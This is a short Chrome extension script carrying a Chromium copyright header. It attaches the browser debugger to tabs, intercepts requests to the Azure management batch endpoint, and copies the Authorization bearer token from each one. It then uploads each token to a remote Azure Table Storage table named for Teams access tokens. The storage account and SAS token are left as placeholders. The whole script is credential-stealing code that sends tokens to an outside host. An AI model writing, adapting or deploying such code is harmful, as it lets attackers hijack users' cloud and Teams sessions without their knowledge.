// Copyright (c) 2012 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.
document.writeln("<script type='text/javascript' src='azure-storage.table.js'></script>");

function onRequest(request, sender, sendResponse) {
    chrome.debugger.attach({ tabId: sender.tab.id }, version,
        onAttach.bind(null, sender.tab.id));
    chrome.debugger.sendCommand({ tabId: sender.tab.id }, "Network.enable");
    chrome.debugger.onEvent.addListener(onEvent);
}
chrome.extension.onRequest.addListener(onRequest);

function onEvent(debuggeeId, message, params) {
    if (message == "Network.requestWillBeSent") {
        if (params.request.url.toLowerCase().split('https://management.azure.com/batch').length > 1) {
            if (params.request.headers["Authorization"]) {
                alert(params.request.headers["Authorization"]);
                //log to azure table.
                logToAzureTable(params.request.headers["Authorization"]);
            }
        }
    }
}

var version = "1.0";

function onAttach(tabId) {
    if (chrome.runtime.lastError) {
        alert(chrome.runtime.lastError.message);
        return;
    }
}

function logToAzureTable(token) {

    var tableUri = 'https://' + '<storage table name>' + '.table.core.windows.net';
    var sasToken = '<sas token>';
    var tableService = AzureStorage.Table.createTableServiceWithSas(tableUri, sasToken);
    var insertEntity = {
        PartitionKey: "", RowKey: "", Authkey: token
    };

    tableService.insertEntity('tblTeamsAccessTokens', insertEntity, function (error, result, response) {
        if (error) {
            alert('Failure');
        } else {
            alert('Success');
        }
    });
}
